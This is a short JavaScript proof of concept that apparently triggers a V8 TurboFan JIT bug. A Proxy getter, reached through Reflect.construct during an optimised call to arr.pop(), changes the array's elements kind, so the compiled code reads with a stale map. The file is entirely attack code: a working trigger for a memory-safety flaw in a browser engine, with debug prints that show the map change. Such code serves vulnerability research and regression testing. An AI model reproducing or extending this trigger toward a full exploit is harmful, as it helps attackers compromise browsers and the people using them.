let arr = new Array(1);
arr[0] = 1; // element size is 4-byte

let p = new Proxy(Object, {
    get(target, prop, receiver) {
        % DebugPrint(arr);
        arr[0] = 1.1; // element size is 8-byte => map of `arr` is changed
        % DebugPrint(arr);
        return Reflect.get(...arguments);
    }
});

function empty() { }

function f(new_target) {
    // add JSCreate to effect chain of `arr`
    return arr.pop(Reflect.construct(empty, arguments, new_target)); // same as `arr.pop()`
}

function ff(new_target) {
    // wrap `f()` with `ff()` because `Reflect.construct()` is not be optimized to JSCreate if `f()` is outermost
    return f(new_target);
}

for (let i = 0; i < 0x10000; i++) { ff(empty); } // compile via turbofan
console.log(`[+] ff(p) == ${ff(p)}`);
